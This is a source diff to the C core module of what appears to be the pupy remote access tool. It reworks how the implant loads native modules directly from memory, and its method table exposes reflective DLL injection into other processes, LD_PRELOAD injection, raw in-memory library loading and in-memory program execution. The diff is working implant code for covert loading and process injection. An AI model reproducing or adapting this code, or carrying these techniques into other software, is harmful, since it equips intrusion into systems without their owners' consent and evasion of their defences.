@@ -8,6 +8,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <sys/wait.h>
+#include <limits.h>
 #include "debug.h"
 #include "Python-dynload.h"
 #include "daemonize.h"
@@ -20,59 +21,16 @@
 #include "injector.h"
 #endif
 
-#include "library.c"
-
 #include "revision.h"
 
 static const char module_doc[] = DOC("Builtins utilities for pupy");
 
-static char pupy_config[65536] = "####---PUPY_CONFIG_COMES_HERE---####\n";
 
 static PyObject *ExecError;
-
-#include "lzmaunpack.c"
 
 #ifdef _PUPY_SO
 #include "jni_on_load.c"
 #endif
-
-static PyObject *Py_get_modules(PyObject *self, PyObject *args)
-{
-    static PyObject *modules = NULL;
-    if (!modules) {
-        modules = PyDict_lzmaunpack(
-            library_c_start,
-            library_c_size
-        );
-        Py_XINCREF(modules);
-
-        munmap((char *) library_c_start,
-            library_c_size);
-    }
-
-    Py_XINCREF(modules);
-    return modules;
-}
-
-static PyObject *
-Py_get_pupy_config(PyObject *self, PyObject *args)
-{
-    static PyObject *config = NULL;
-    if (!config) {
-        unsigned int pupy_lzma_length = 0x0;
-        memcpy(&pupy_lzma_length, pupy_config, sizeof(unsigned int));
-
-        ssize_t compressed_size = ntohl(pupy_lzma_length);
-
-        config = PyObject_lzmaunpack(pupy_config+sizeof(int), compressed_size);
-        memset(pupy_config, 0xFF, compressed_size);
-
-        Py_XINCREF(config);
-    }
-
-    Py_XINCREF(config);
-    return config;
-}
 
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 {
@@ -232,6 +190,64 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
     return PyLong_FromVoidPtr(memdlopen(dllname, lpDllBuffer, dwDllLenght, RTLD_LOCAL | RTLD_NOW));
 }
 
+bool
+import_module(const char *initfuncname, char *modname, const char *data, size_t size) {
+    char *oldcontext;
+
+    dprint("import_module: init=%s mod=%s (%p:%lu)\n",
+           initfuncname, modname, data, size);
+
+    void *hmem = memdlopen(modname, data, size, RTLD_LOCAL | RTLD_NOW);
+    if (!hmem) {
+        dprint("Couldn't load %s: %m\n", modname);
+        return false;
+    }
+
+    void (*do_init)() = dlsym(hmem, initfuncname);
+    if (!do_init) {
+        dprint("Couldn't find sym %s in %s: %m\n", initfuncname, modname);
+        dlclose(hmem);
+        return false;
+    }
+
+    oldcontext = _Py_PackageContext;
+    _Py_PackageContext = modname;
+    dprint("Call %s@%s (%p)\n", initfuncname, modname, do_init);
+    do_init();
+    _Py_PackageContext = oldcontext;
+
+    dprint("Call %s@%s (%p) - complete\n", initfuncname, modname, do_init);
+
+    return true;
+}
+
+static PyObject *
+Py_import_module(PyObject *self, PyObject *args) {
+    char *data;
+    int size;
+    char *initfuncname;
+    char *modname;
+    char *pathname;
+
+    /* code, initfuncname, fqmodulename, path */
+    if (!PyArg_ParseTuple(args, "s#sss:import_module",
+                  &data, &size,
+                  &initfuncname, &modname, &pathname)) {
+        return NULL;
+    }
+
+    dprint("DEBUG! %s@%s\n", initfuncname, modname);
+
+    if (!import_module(initfuncname, modname, data, size)) {
+        PyErr_Format(PyExc_ImportError,
+                 "Could not find function %s", initfuncname);
+        return NULL;
+    }
+
+    /* Retrieve from sys.modules */
+    return PyImport_ImportModule(modname);
+}
+
 static PyObject *Py_mexec(PyObject *self, PyObject *args)
 {
     const char *buffer = NULL;
@@ -291,31 +307,41 @@ static PyObject *Py_mexec(PyObject *self, PyObject *args)
     return Py_BuildValue("i(OOO)", pid, p_stdin, p_stdout, p_stderr);
 }
 
+static PyObject *Py_is_shared_object(PyObject *self, PyObject *args)
+{
+#ifdef _PUPY_SO
+        return PyBool_FromLong(1);
+#else
+        return PyBool_FromLong(0);
+#endif
+}
+
 static PyMethodDef methods[] = {
-    { "get_pupy_config", Py_get_pupy_config, METH_NOARGS, DOC("get_pupy_config() -> string") },
+    { "is_shared", Py_is_shared_object, METH_NOARGS, DOC("Client is shared object") },
     { "get_arch", Py_get_arch, METH_NOARGS, DOC("get current pupy architecture (x86 or x64)") },
-    { "get_modules", Py_get_modules, METH_NOARGS, DOC("get pupy library") },
 #ifdef Linux
     { "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS,
       DOC("reflective_inject_dll(pid, dll_buffer)\nreflectively inject a dll into a process. raise an Exception on failure")
     },
 #endif
     { "load_dll", Py_load_dll, METH_VARARGS, DOC("load_dll(dllname, raw_dll) -> ptr") },
+    { "import_module", Py_import_module, METH_VARARGS,
+      DOC("import_module(data, size, initfuncname, path) -> module") },
     { "mexec", Py_mexec, METH_VARARGS, DOC("mexec(data, argv, redirected_stdio, detach) -> (pid, (in, out, err))") },
     { "ld_preload_inject_dll", Py_ld_preload_inject_dll, METH_VARARGS, DOC("ld_preload_inject_dll(cmdline, dll_buffer, hook_exit) -> pid") },
     { NULL, NULL },     /* Sentinel */
 };
 
 DL_EXPORT(void)
-initpupy(void) {
+init_pupy(void) {
 
-    PyObject *pupy = Py_InitModule3("pupy", methods, (char *) module_doc);
+    PyObject *pupy = Py_InitModule3("_pupy", methods, (char *) module_doc);
     if (!pupy) {
         return;
     }
 
     PyModule_AddStringConstant(pupy, "revision", GIT_REVISION_HEAD);
-    ExecError = PyErr_NewException("pupy.error", NULL, NULL);
+    ExecError = PyErr_NewException("_pupy.error", NULL, NULL);
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
 
